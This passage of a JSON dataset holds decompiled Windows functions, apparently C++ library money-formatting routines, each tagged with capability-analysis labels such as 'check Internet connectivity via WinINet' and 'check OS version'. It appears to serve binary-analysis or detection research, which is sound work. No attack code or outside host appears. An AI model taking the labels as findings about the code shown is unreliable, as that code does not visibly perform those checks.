iStack256 + 1;\n    } while (iVar6 + 1 < 4);\n    if ((uStack96 < 2) || (uVar8 = fcn.14002f7b0(&puStack104, 0x30, 0),  uVar8 == 0)) goto code_r0x00014003f53d;\n    if (uVar8 == 0xffffffffffffffff) {\n        uVar8 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x00014003f53d;\n        }\n        if (uVar8 == 0) goto code_r0x00014003f53d;\n    }\n    uVar11 = uStack96;\n    if (uVar8 < uStack96) {\n        uVar11 = uVar8;\n    }\n    fcn.1400a9130(&puStack104, 0, uVar11);\ncode_r0x00014003f53d:\n    uVar8 = uStack128;\n    if (uStack128 != 0) {\n        uVar11 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar9 = 0xf;\n        }\n        else {\n            uVar9 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar9 < uVar11) {\n            fcn.1400a9390(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar8] = 0;\n        puStack136[uVar8 + 1] = 0;\n        uStack128 = uVar11;\n        cVar5 = fcn.1400b7670(*(iVar12 + 0x10), *(iVar12 + 0x18), &puStack136);\n        if (cVar5 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar14 = piVar2 == -1;\n    fcn.1400a78c0(in_stack_00000038, &puStack104);\n    bVar13 = piVar10 != NULL && bVar14;\n    if ((piVar10 != NULL && bVar14) && (bVar14 = false,  piVar10[3] <= piVar10[2])) {\n        iVar6 = (**(*piVar10 + 0x48))(piVar10);\n        if (iVar6 == -1) {\n            piVar10 = NULL;\n        }\n        bVar14 = iVar6 == -1 && bVar13;\n    }\n    bVar13 = piVar3 == -1;\n    if (((piVar4 != NULL) && (bVar13)) && (bVar13 = false,  piVar4[3] <= piVar4[2])) {\n        iVar6 = (**(*piVar4 + 0x48))(piVar4);\n        bVar13 = iVar6 == -1;\n    }\n    if (bVar14 == bVar13) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piVar10;\n    arg1[1] = piVar2;\n    if (puStack104 != auStack88) {\n        fcn.1400bc6c0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400bc6c0();\n    }\n    return arg1;\n}\n",
        "token_count": 2466
    },
    "14004016": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001400408b5)\n// WARNING: Removing unreachable block (ram,0x000140040c7f)\n// WARNING: Removing unreachable block (ram,0x000140040c8c)\n// WARNING: Removing unreachable block (ram,0x0001400403cb)\n// WARNING: Removing unreachable block (ram,0x0001400403d0)\n// WARNING: Removing unreachable block (ram,0x0001400403d9)\n// WARNING: Removing unreachable block (ram,0x000140040a66)\n// WARNING: Removing unreachable block (ram,0x000140041216)\n// WARNING: Removing unreachable block (ram,0x000140040a74)\n// WARNING: Removing unreachable block (ram,0x000140040a77)\n// WARNING: Removing unreachable block (ram,0x000140040a7d)\n// WARNING: Removing unreachable block (ram,0x000140040a81)\n// WARNING: Removing unreachable block (ram,0x0001400403db)\n// WARNING: Removing unreachable block (ram,0x0001400403e6)\n// WARNING: Removing unreachable block (ram,0x000140040e69)\n// WARNING: Removing unreachable block (ram,0x0001400403f4)\n// WARNING: Removing unreachable block (ram,0x0001400403fc)\n// WARNING: Removing unreachable block (ram,0x00014004035a)\n// WARNING: Removing unreachable block (ram,0x00014004036d)\n// WARNING: Removing unreachable block (ram,0x000140040a86)\n// WARNING: Removing unreachable block (ram,0x000140040371)\n// WARNING: Removing unreachable block (ram,0x000140040380)\n// WARNING: Removing unreachable block (ram,0x000140040db8)\n// WARNING: Removing unreachable block (ram,0x0001400410de)\n// WARNING: Removing unreachable block (ram,0x000140040dc6)\n// WARNING: Removing unreachable block (ram,0x000140040dc9)\n// WARNING: Removing unreachable block (ram,0x000140040dd2)\n// WARNING: Removing unreachable block (ram,0x000140040dda)\n// WARNING: Removing unreachable block (ram,0x000140040dde)\n// WARNING: Removing unreachable block (ram,0x000140040398)\n// WARNING: Removing unreachable block (ram,0x00014004039b)\n// WARNING: Removing unreachable block (ram,0x000140040c28)\n// WARNING: Removing unreachable block (ram,0x0001400411db)\n// WARNING: Removing unreachable block (ram,0x000140040c36)\n// WARNING: Removing unreachable block (ram,0x000140040c39)\n// WARNING: Removing unreachable block (ram,0x000140040c47)\n// WARNING: Removing unreachable block (ram,0x000140040c4b)\n// WARNING: Removing unreachable block (ram,0x000140040c4f)\n// WARNING: Removing unreachable block (ram,0x0001400403b4)\n// WARNING: Removing unreachable block (ram,0x0001400403bd)\n// WARNING: Removing unreachable block (ram,0x000140040c58)\n// WARNING: Removing unreachable block (ram,0x000140040c66)\n// WARNING: Removing unreachable block (ram,0x000140040d57)\n// WARNING: Removing unreachable block (ram,0x0001400408bd)\n\nint64_t ** fcn.140040160(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    char cVar7;\n    int16_t iVar8;\n    int64_t arg3_00;\n    int64_t **ppiVar9;\n    uint64_t uVar10;\n    int64_t *arg1_00;\n    uint64_t uVar11;\n    int64_t *piVar12;\n    uint64_t uVar13;\n    bool bVar14;\n    bool bVar15;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack280;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar12 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b9850(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.14002c080(0x1401087e0);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iStack280 = *piVar1;\n    if (iStack280 == 0) {\n        arg1_00 = fcn.1400bc710(0x80);\n        *(arg1_00 + 1) = 0;\n        iVar6 = *0x140110610;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar6 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.1400a0dc0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iStack280 = *piVar1;\n    }\n    uStack120 = 0;\n    uStack128 = 0;\n    puStack136 = &uStack120;\n    if (*(iStack280 + 0x20) != '\\0') {\n        fcn.1400a9080(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a9080(&puStack104, 0x20);\n    iStack256 = 0;\n    uStack140 = *(iStack280 + 0x60);\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140040332. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010b330\n            ppiVar9 = (*(*(*(&uStack140 + iStack256) * 4 + 0x14010b330) + 0x14010b330))();\n            return ppiVar9;\n        }\n        iVar5 = iStack256;\n        iStack256 = iStack256 + 1;\n    } while (iVar5 + 1 < 4);\n    if ((uStack96 < 2) || (uVar10 = fcn.14002f7b0(&puStack104, 0x30, 0),  uVar10 == 0)) goto code_r0x000140040c75;\n    if (uVar10 == 0xffffffffffffffff) {\n        uVar10 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x000140040c75;\n        }\n        if (uVar10 == 0) goto code_r0x000140040c75;\n    }\n    uVar13 = uStack96;\n    if (uVar10 <= uStack96) {\n        uVar13 = uVar10;\n    }\n    fcn.1400a9130(&puStack104, 0, uVar13);\ncode_r0x000140040c75:\n    uVar10 = uStack128;\n    if (uStack128 != 0) {\n        uVar13 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar11 = 0xf;\n        }\n        else {\n            uVar11 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar11 < uVar13) {\n            fcn.1400a9390(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar10] = 0;\n        puStack136[uVar10 + 1] = 0;\n        uStack128 = uVar13;\n        cVar7 = fcn.1400b7670(*(iStack280 + 0x10), *(iStack280 + 0x18), &puStack136);\n        if (cVar7 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar15 = piVar2 == -1;\n    fcn.1400a78c0(in_stack_00000038, &puStack104);\n    bVar14 = piVar12 != NULL;\n    if (bVar14 && bVar15) {\n        if (piVar12[2] < piVar12[3]) {\n            iVar8 = *piVar12[2];\n        }\n        else {\n            iVar8 = (**(*piVar12 + 0x48))(piVar12);\n        }\n        if (iVar8 == -1) {\n            piVar12 = NULL;\n        }\n        bVar15 = iVar8 == -1 && (bVar14 && bVar15);\n    }\n    bVar14 = piVar3 == -1;\n    if ((piVar4 != NULL) && (bVar14)) {\n        if (piVar4[2] < piVar4[3]) {\n            iVar8 = *piVar4[2];\n        }\n        else {\n            iVar8 = (**(*piVar4 + 0x48))(piVar4);\n        }\n        bVar14 = iVar8 == -1;\n    }\n    if (bVar14 == bVar15) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    arg1[1] = piVar2;\n    *arg1 = piVar12;\n    if (puStack104 != auStack88) {\n        fcn.1400bc6c0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400bc6c0();\n    }\n    return arg1;\n}\n",
        "token_count": 2544
    },
    "1400414a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140041bf5)\n// WARNING: Removing unreachable block (ram,0x000140041fbf)\n// WARNING: Removing unreachable block (ram,0x000140041fcc)\n// WARNING: Removing unreachable block (ram,0x00014004170b)\n// WARNING: Removing unreachable block (ram,0x000140041710)\n// WARNING: Removing unreachable block (ram,0x000140041719)\n// WARNING: Removing unreachable block (ram,0x000140041da6)\n// WARNING: Removing unreachable block (ram,0x000140042556)\n// WARNING: Removing unreachable block (ram,0x000140041db4)\n// WARNING: Removing unreachable block (ram,0x000140041db7)\n// WARNING: Removing unreachable block (ram,0x000140041dbd)\n// WARNING: Removing unreachable block (ram,0x000140041dc1)\n// WARNING: Removing unreachable block (ram,0x00014004171b)\n// WARNING: Removing unreachable block (ram,0x000140041726)\n// WARNING: Removing unreachable block (ram,0x0001400421a9)\n// WARNING: Removing unreachable block (ram,0x000140041734)\n// WARNING: Removing unreachable block (ram,0x00014004173c)\n// WARNING: Removing unreachable block (ram,0x00014004169a)\n// WARNING: Removing unreachable block (ram,0x0001400416ad)\n// WARNING: Removing unreachable block (ram,0x000140041dc6)\n// WARNING: Removing unreachable block (ram,0x0001400416b1)\n// WARNING: Removing unreachable block (ram,0x0001400416c0)\n// WARNING: Removing unreachable block (ram,0x0001400420f8)\n// WARNING: Removing unreachable block (ram,0x00014004241e)\n// WARNING: Removing unreachable block (ram,0x000140042106)\n// WARNING: Removing unreachable block (ram,0x000140042109)\n// WARNING: Removing unreachable block (ram,0x000140042112)\n// WARNING: Removing unreachable block (ram,0x00014004211a)\n// WARNING: Removing unreachable block (ram,0x00014004211e)\n// WARNING: Removing unreachable block (ram,0x0001400416d8)\n// WARNING: Removing unreachable block (ram,0x0001400416db)\n// WARNING: Removing unreachable block (ram,0x000140041f68)\n// WARNING: Removing unreachable block (ram,0x00014004251b)\n// WARNING: Removing unreachable block (ram,0x000140041f76)\n// WARNING: Removing unreachable block (ram,0x000140041f79)\n// WARNING: Removing unreachable block (ram,0x000140041f87)\n// WARNING: Removing unreachable block (ram,0x000140041f8b)\n// WARNING: Removing unreachable block (ram,0x000140041f8f)\n// WARNING: Removing unreachable block (ram,0x0001400416f4)\n// WARNING: Removing unreachable block (ram,0x0001400416fd)\n// WARNING: Removing unreachable block (ram,0x000140041f98)\n// WARNING: Removing unreachable block (ram,0x000140041fa6)\n// WARNING: Removing unreachable block (ram,0x000140042097)\n// WARNING: Removing unreachable block (ram,0x000140041bfd)\n\nint64_t ** fcn.1400414a0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    char cVar7;\n    int16_t iVar8;\n    int64_t arg3_00;\n    int64_t **ppiVar9;\n    uint64_t uVar10;\n    int64_t *arg1_00;\n    uint64_t uVar11;\n    int64_t *piVar12;\n    uint64_t uVar13;\n    bool bVar14;\n    bool bVar15;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack280;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar12 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b9850(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.14002c080(0x1401087f0);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iStack280 = *piVar1;\n    if (iStack280 == 0) {\n        arg1_00 = fcn.1400bc710(0x80);\n        *(arg1_00 + 1) = 0;\n        iVar6 = *0x140110620;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar6 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.1400a15e0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iStack280 = *piVar1;\n    }\n    uStack120 = 0;\n    uStack128 = 0;\n    puStack136 = &uStack120;\n    if (*(iStack280 + 0x20) != '\\0') {\n        fcn.1400a9080(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a9080(&puStack104, 0x20);\n    iStack256 = 0;\n    uStack140 = *(iStack280 + 0x60);\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140041672. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010b31c\n            ppiVar9 = (*(*(*(&uStack140 + iStack256) * 4 + 0x14010b31c) + 0x14010b31c))();\n            return ppiVar9;\n        }\n        iVar5 = iStack256;\n        iStack256 = iStack256 + 1;\n    } while (iVar5 + 1 < 4);\n    if ((uStack96 < 2) || (uVar10 = fcn.14002f7b0(&puStack104, 0x30, 0),  uVar10 == 0)) goto code_r0x000140041fb5;\n    if (uVar10 == 0xffffffffffffffff) {\n        uVar10 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x000140041fb5;\n        }\n        if (uVar10 == 0) goto code_r0x000140041fb5;\n    }\n    uVar13 = uStack96;\n    if (uVar10 <= uStack96) {\n        uVar13 = uVar10;\n    }\n    fcn.1400a9130(&puStack104, 0, uVar13);\ncode_r0x000140041fb5:\n    uVar10 = uStack128;\n    if (uStack128 != 0) {\n        uVar13 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar11 = 0xf;\n        }\n        else {\n            uVar11 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar11 < uVar13) {\n            fcn.1400a9390(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar10] = 0;\n        puStack136[uVar10 + 1] = 0;\n        uStack128 = uVar13;\n        cVar7 = fcn.1400b7670(*(iStack280 + 0x10), *(iStack280 + 0x18), &puStack136);\n        if (cVar7 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar15 = piVar2 == -1;\n    fcn.1400a78c0(in_stack_00000038, &puStack104);\n    bVar14 = piVar12 != NULL;\n    if (bVar14 && bVar15) {\n        if (piVar12[2] < piVar12[3]) {\n            iVar8 = *piVar12[2];\n        }\n        else {\n            iVar8 = (**(*piVar12 + 0x48))(piVar12);\n        }\n        if (iVar8 == -1) {\n            piVar12 = NULL;\n        }\n        bVar15 = iVar8 == -1 && (bVar14 && bVar15);\n    }\n    bVar14 = piVar3 == -1;\n    if ((piVar4 != NULL) && (bVar14)) {\n        if (piVar4[2] < piVar4[3]) {\n            iVar8 = *piVar4[2];\n        }\n        else {\n            iVar8 = (**(*piVar4 + 0x48))(piVar4);\n        }\n        bVar14 = iVar8 == -1;\n    }\n    if (bVar14 == bVar15) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    arg1[1] = piVar2;\n    *arg1 = piVar12;\n    if (puStack104 != auStack88) {\n        fcn.1400bc6c0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400bc6c0();\n    }\n    return arg1;\n}\n",
        "token_count": 2541
    },
    "140042f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140042f30(int64_t **arg1, ulong noname_1, int64_t **arg3, uint8_t *arg4)\n\n{\n    uint8_t *arg2;\n    int64_t **ppiVar1;\n    uchar uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t arg3_00;\n    uchar *puVar7;\n    int64_t *piVar8;\n    ulong uVar9;\n    uint8_t *puVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    uchar **ppuVar14;\n    uint64_t uVar15;\n    uint32_t uVar16;\n    uint8_t *arg4_00;\n    int32_t iVar17;\n    int64_t *piVar18;\n    uchar in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack248;\n    uchar *puStack232;\n    uint8_t *puStack216;\n    uint8_t *puStack184;\n    uint uStack140;\n    uchar *puStack136;\n    uint8_t *puStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint8_t *puStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    \n    piVar3 = *arg3;\n    piVar18 = arg3[1];\n    arg4_00 = arg4;\n    iVar6 = fcn.1400b97f0(arg4 + 0xd0);\n    arg3_00 = fcn.14002c080(0x1401087c0);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + arg3_00 * 8;\n    piVar8 = *ppiVar1;\n    if (piVar8 == NULL) {\n        piVar8 = fcn.1400bc710(0x70);\n        *(piVar8 + 1) = 0;\n        iVar4 = *0x1401105f0;\n        piVar8[2] = 0;\n        piVar8[3] = 0;\n        *piVar8 = iVar4 + 0x10;\n        *(piVar8 + 4) = 0;\n        *(piVar8 + 0x21) = 0;\n        piVar8[5] = 0;\n        piVar8[6] = 0;\n        piVar8[7] = 0;\n        piVar8[8] = 0;\n        piVar8[9] = 0;\n        piVar8[10] = 0;\n        *(piVar8 + 0xb) = 0;\n        *(piVar8 + 0x5c) = 0;\n        *(piVar8 + 0x6f) = 0;\n        fcn.14009fd60(piVar8, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), piVar8, arg3_00);\n        piVar8 = *ppiVar1;\n    }\n    puVar11 = *in_stack_00000030;\n    if (*puVar11 == *(piVar8 + 100)) {\n        uStack140 = *(piVar8 + 0xc);\n        puStack232 = piVar8[9];\n        uStack248 = piVar8[10];\n        if (in_stack_00000030[1] == NULL) goto code_r0x000140043007;\n        puVar11 = puVar11 + 1;\n    }\n    else {\n        uStack140 = *(piVar8 + 0x5c);\n        puStack232 = piVar8[7];\n        uStack248 = piVar8[8];\n    }\n    puVar10 = in_stack_00000030[1] + puVar11;\n    if (puVar10 <= puVar11) goto code_r0x000140043007;\n    puVar13 = puVar11;\n    do {\n        if ((*(*(iVar6 + 0x30) + *puVar13 * 2) & 8) == 0) break;\n        puVar13 = puVar13 + 1;\n    } while (puVar10 != puVar13);\n    puVar13 = puVar13 + -puVar11;\n    if (puVar13 == NULL) goto code_r0x000140043007;\n    puStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400a9080(&puStack136, puVar13 * 2);\n    iVar5 = *(piVar8 + 0xb);\n    iVar17 = puVar13 - iVar5;\n    if (iVar17 < 1) {\ncode_r0x00014004313c:\n        puVar10 = puStack128;\n        if (iVar5 < 1) {\ncode_r0x000140043151:\n            uVar16 = *(arg4 + 0x18) & 0xb0;\n            puStack216 = puStack128 + uStack248;\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                puStack216 = puStack216 + piVar8[6];\n            }\n            puStack96 = NULL;\n            uStack88 = 0;\n            puStack104 = &uStack88;\n            fcn.1400a9080(&puStack104, puStack216 * 2);\n            puVar11 = *(arg4 + 0x10);\n            ppuVar14 = &uStack140;\n            puStack184 = puStack96;\n            do {\n                if (*ppuVar14 < 5) {\n    // switch table (5 cases) at 0x14010b014\n                    switch(*ppuVar14) {\n                    case 0:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) {\ncode_r0x00014004333a:\n                            arg4_00 = puVar11 + -puStack216;\n                            fcn.1400a76a0(&puStack104, puStack184, 0, arg4_00);\n                            puStack184 = puStack96;\n                        }\n                        break;\n                    case 1:\ncode_r0x0001400432b8:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) goto code_r0x00014004333a;\n                        if (puStack104 == &uStack88) {\n                            puVar10 = 0xf;\n                        }\n                        else {\n                            puVar10 = CONCAT71(Stack87, uStack88);\n                        }\n                        if (puVar10 < puStack184 + 1) {\n                            arg4_00 = NULL;\n                            fcn.1400a9390(&puStack104, puStack184, 0, 0);\n                        }\n                        puStack104[puStack184] = in_stack_00000028;\ncode_r0x000140043308:\n                        puStack184 = puStack184 + 1;\n                        puStack96 = puStack184;\n                        puStack104[puStack184] = 0;\n                        break;\n                    case 2:\n                        if ((arg4[0x19] & 2) != 0) {\n                            puVar10 = piVar8[6];\n                            puVar7 = piVar8[5];\n                            if (puVar10 <= 0x3fffffffffffffff - puStack184) goto code_r0x00014004338e;\n                            fcn.1400bd360(0x14010af72);\n                            goto code_r0x0001400432b8;\n                        }\n                        break;\n                    case 3:\n                        if (uStack248 != 0) {\n                            uVar2 = *puStack232;\n                            if (puStack104 == &uStack88) {\n                                puVar10 = 0xf;\n                            }\n                            else {\n                                puVar10 = CONCAT71(Stack87, uStack88);\n                            }\n                            if (puVar10 < puStack184 + 1) {\n                                arg4_00 = NULL;\n                                fcn.1400a9390(&puStack104, puStack184, 0, 0);\n                            }\n                            puStack104[puStack184] = uVar2;\n                            goto code_r0x000140043308;\n                        }\n                        break;\n                    case 4:\n                        puVar7 = puStack136;\n                        puVar10 = puStack128;\n                        if (0x3fffffffffffffff - puStack184 < puStack128) goto code_r0x000140043770;\ncode_r0x00014004338e:\n                        fcn.1400a91c0(&puStack104, puVar7, puVar10);\n                        puStack184 = puStack96;\n                    }\n                }\n                ppuVar14 = ppuVar14 + 1;\n            } while (ppuVar14 != &puStack136);\n            if (1 < uStack248) {\n                puVar13 = uStack248 - 1;\n                if (0x3fffffffffffffff - puStack184 < puVar13) {\n                    fcn.1400bd360(0x14010af72);\n                    goto code_r0x000140043751;\n                }\n                fcn.1400a91c0(&puStack104, puStack232 + 1, puVar13);\n                puStack184 = puStack96;\n            }\n            if (puStack184 < puVar11) {\n                if (uVar16 == 0x20) {\n                    fcn.1400a76a0(&puStack104, puStack184, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n                else {\n                    fcn.1400a76a0(&puStack104, 0, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n            }\n            uVar15 = piVar18 & 0xffffffff;\n            if ((piVar18 == '\\0') &&\n               (iVar6 = (**(*piVar3 + 0x60))(piVar3, puStack104, puStack184),  puStack184 != iVar6)) {\n                uVar15 = 1;\n            }\n            piVar18 = piVar18 & 0xffffffffffffff00 | uVar15 & 0xff;\n            if (puStack104 != &uStack88) {\n                fcn.1400bc6c0(puStack104);\n            }\n            if (puStack136 != &uStack120) {\n                fcn.1400bc6c0();\n            }\ncode_r0x000140043007:\n            *(arg4 + 0x10) = 0;\n            arg1[1] = piVar18;\n            *arg1 = piVar3;\n            return arg1;\n        }\n        uVar2 = *(piVar8 + 0x21);\n        arg2 = puStack128 + 1;\n        if (puStack136 == &uStack120) {\n            puVar12 = 0xf;\n        }\n        else {\n            puVar12 = CONCAT71(Stack119, uStack120);\n        }\n        if (puVar12 < arg2) {\n            arg4_00 = NULL;\n            fcn.1400a9390(&puStack136, puStack128, 0, 0);\n        }\n        puStack136[puVar10] = uVar2;\n        (puStack136 + 1)[puVar10] = 0;\n        puStack128 = arg2;\n        if (iVar17 < 0) {\n            arg4_00 = -iVar17;\n            fcn.1400a76a0(&puStack136, arg2, 0, arg4_00);\n            if (0x3fffffffffffffff - puStack128 < puVar13) goto code_r0x00014004377c;\ncode_r0x00014004352a:\n            fcn.1400a91c0(&puStack136, puVar11, puVar13);\n            goto code_r0x000140043151;\n        }\n        puVar13 = *(piVar8 + 0xb);\n        puVar11 = puVar11 + iVar17;\n        if (puVar13 <= 0x3fffffffffffffff - arg2) goto code_r0x00014004352a;\ncode_r0x000140043751:\n        fcn.1400bd360(0x14010af72);\n        puVar10 = puVar13;\n    }\n    else {\n        if (iVar5 < 0) {\n            iVar17 = puVar13;\n        }\n        if (piVar8[3] == 0) {\n            arg4_00 = puVar11;\n            fcn.1400a6b40(&puStack136, 0, puStack128, puVar11);\n            iVar5 = *(piVar8 + 0xb);\n            goto code_r0x00014004313c;\n        }\n        fcn.1400a76a0(&puStack136, 0, puStack128, iVar17 * 2);\n        puVar7 = fcn.1400b60e0(puStack136, *(piVar8 + 0x22), piVar8[2], piVar8[3]);\n        puVar10 = puVar7 + -puStack136;\n        arg4_00 = puStack128;\n        if (puVar10 <= puStack128) {\n            *puVar7 = 0;\n            iVar5 = *(piVar8 + 0xb);\n            puStack128 = puVar10;\n            goto code_r0x00014004313c;\n        }\n    }\n    fcn.1400b7b60(0x14010afc8, 0x14010afb4, puVar10, arg4_00);\ncode_r0x000140043770:\n    fcn.1400bd360(0x14010af72);\ncode_r0x00014004377c:\n    uVar9 = fcn.1400bd360(0x14010af72);\n    fcn.1400bc860(uVar9);\n    (**(*piVar8 + 8))(piVar8);\n    do {\n        uVar9 = fcn.1400bcd60();\n        fcn.1400bc860(uVar9);\n    } while( true );\n}\n",
        "token_count": 3187
    },
    "14004380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140043800(int64_t **arg1, ulong noname_1, int64_t **arg3, uint8_t *arg4)\n\n{\n    uint8_t *arg2;\n    int64_t **ppiVar1;\n    uchar uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t arg3_00;\n    uchar *puVar7;\n    int64_t *piVar8;\n    ulong uVar9;\n    uint8_t *puVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    uchar **ppuVar14;\n    uint64_t uVar15;\n    uint32_t uVar16;\n    uint8_t *arg4_00;\n    int32_t iVar17;\n    int64_t *piVar18;\n    uchar in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack248;\n    uchar *puStack232;\n    uint8_t *puStack216;\n    uint8_t *puStack184;\n    uint uStack140;\n    uchar *puStack136;\n    uint8_t *puStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint8_t *puStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    \n    piVar3 = *arg3;\n    piVar18 = arg3[1];\n    arg4_00 = arg4;\n    iVar6 = fcn.1400b97f0(arg4 + 0xd0);\n    arg3_00 = fcn.14002c080(0x1401087d0);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + arg3_00 * 8;\n    piVar8 = *ppiVar1;\n    if (piVar8 == NULL) {\n        piVar8 = fcn.1400bc710(0x70);\n        *(piVar8 + 1) = 0;\n        